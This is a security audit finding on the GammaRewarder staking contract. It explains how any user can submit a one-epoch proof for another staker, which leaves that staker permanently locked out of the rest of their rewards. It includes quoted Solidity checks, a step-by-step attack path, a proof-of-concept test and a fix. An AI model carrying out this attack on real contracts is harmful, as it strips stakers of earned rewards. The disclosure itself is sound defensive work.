# Forced partial claim leads to reward loss and fund lock

### Summary

The `GammaRewarder` contract is vulnerable to a staking reward manipulation that can lead to a permanent lock of user funds. In instances where a distribution contains multiple epochs, any user can interfere with another user's ability to claim the full range of eligible epochs. This results in only partial rewards being accessible for the affected user while blocking access to the remaining rewards indefinitely. This vulnerability could potentially lead to significant loss of staking incentives for impacted users.

### Root Cause

The issue arises in the `handleProofResult` function, where the block range (`startBlock` and `endBlock`) used for staking proof validation is loosely checked against the distribution’s full range. [The following checks](https://github.com/sherlock-audit/2024-10-gamma-rewarder/blob/main/GammaRewarder/contracts/GammaRewarder.sol#L202-L203) are insufficient to prevent partial claims by third-party users on behalf of a target user:

```solidity
require(startBlock < endBlock && (endBlock - startBlock) % blocksPerEpoch == 0, "Claim period must be valid");
require(startBlock >= params.startBlockNumber && endBlock <= params.endBlockNumber, "Claim range has to include distribution range.");
```

While these checks validate that the claimed reward range falls within the distribution range, they do not enforce that the full range of eligible epochs is claimed. Consequently, any user can submit a partial claim for another user, leading to a lesser reward allocation than intended.

The vulnerability is further compounded by the following factors:
1. Once a claim has been processed for a user and reward token, any subsequent claims are blocked by the double-claim prevention mechanism:

   ```solidity
   CumulativeClaim memory claim = claimed[userAddress][rewardTokenAddress][distributionId];
   require(claim.amount == 0 , "Already claimed reward.");
   ```

2. The `totalRewardAmount` is directly derived from the zk proof without validation that it matches the full reward for the distribution range:

   ```solidity
   (
       address userAddress,
       address lpTokenAddress,
       uint64 startBlock,
       uint64 endBlock,
       bytes32 distributionId,
       address rewardTokenAddress,
       uint248 distributionAmountPerEpoch,
       uint248 totalRewardAmount // <--- Here
   ) = decodeOutput(_appCircuitOutput);
   IERC20(rewardTokenAddress).safeTransfer(userAddress, totalRewardAmount);
   ```

### Internal pre-conditions

_No response_

### External pre-conditions

1. The distribution period contains more than one epoch.
2. The victim has staked and is eligible to staking rewards.

### Attack Path

1. The victim stakes tokens in the hypervisor contract.
2. An incentivizer creates a new distribution covering a block range from \( n \) to \( n+100 \) (let's say each epoch equals 20 blocks).
3. A malicious user submits a Brevis request to generate a proof using the authorized circuit, proving the victim’s staking activity from \( n \) to \( n+20 \).
4. The Brevis system sends a callback to the contract, triggering the `handleProofResult` function with this proof.
5. The proof passes all contract validations: the `distributionAmountPerEpoch` matches the distribution’s amount, and `startBlock` and `endBlock` are within the defined distribution range.
6. As a result, the victim is rewarded only 1/5 of the full amount they were entitled to.
7. The victim is now unable to make further claims for the distribution and loses access to the remaining rewards.

### Impact

- The stakers suffer a very high percentage loss during staking depending on the blocksPerEpoch variable and the distribution number of epoch.

### PoC

Replace the [`Claim Test` test function](https://github.com/sherlock-audit/2024-10-gamma-rewarder/blob/main/GammaRewarder/test/Audit.ts#L211-L380) by:

```solidity
  it("POC", async function() {
    const testLpAddress = await users[4].getAddress()
    const distributionId = await rewardContract.getDistributionId(0)
    const amountPerEpoch = 4850000000000000000000n
    const rewardTokenAddress = await rewardToken.getAddress()
    let blocksPerEpoch = await rewardContract.blocksPerEpoch()
    let circuitOutput;

    // Add vkHash
    await rewardContract.addVkHash(VK_HASH)

    let number_of_epoch_distribution = (end_block_num - start_block_num) / blocksPerEpoch;
    console.log("The full number of epoch for distribution is: ", number_of_epoch_distribution);

    // We will request the user reward for only one epoch

    circuitOutput = _getCircuitOutput(
      testLpAddress, 
      hypervisor_address, 
      0, 
      start_block_num,
      start_block_num + blocksPerEpoch, // endblock of the circuit output is only one epoch long
      distributionId, 
      rewardTokenAddress, 
      amountPerEpoch,
      1000 * (1 / Number(number_of_epoch_distribution)) // Then the reward for a valid proof is proportionally reduced. 
      // Since the proof is not validated by a zk circuit in this test, we should assume the original rewardAmount for the full range is 1000
    )
    await rewardContract.claimTest(
      ethers.encodeBytes32String("string"),
      VK_HASH,
      circuitOutput
    )

    console.log("The user should receive in total: ", 1000);
    console.log("The user receive only a part of it: ")
    console.log(await rewardToken.balanceOf(testLpAddress));

    try {
      // In our case, the epoch are the half of the full epoch ditribution reward. So the user should be able to claim what missing using the exact same call
      // But it will not work because of the "Already claimed reward" reason.
      await rewardContract.claimTest(
        ethers.encodeBytes32String("string"),
        VK_HASH,
        circuitOutput
      )} catch (error) { console.log(`${error}`) }
  });
```

### Mitigation

A way to prevent this could be to only authorize claiming for the full distribution range:

Then replace [this line](https://github.com/sherlock-audit/2024-10-gamma-rewarder/blob/main/GammaRewarder/contracts/GammaRewarder.sol#L203):
```solidity
require(startBlock >= params.startBlockNumber && endBlock <= params.endBlockNumber, "Claim range has to include distribution range.");
```

With this one:
```solidity
require(startBlock == params.startBlockNumber && endBlock == params.endBlockNumber, "Claim range has to be equal to distribution range.");
```
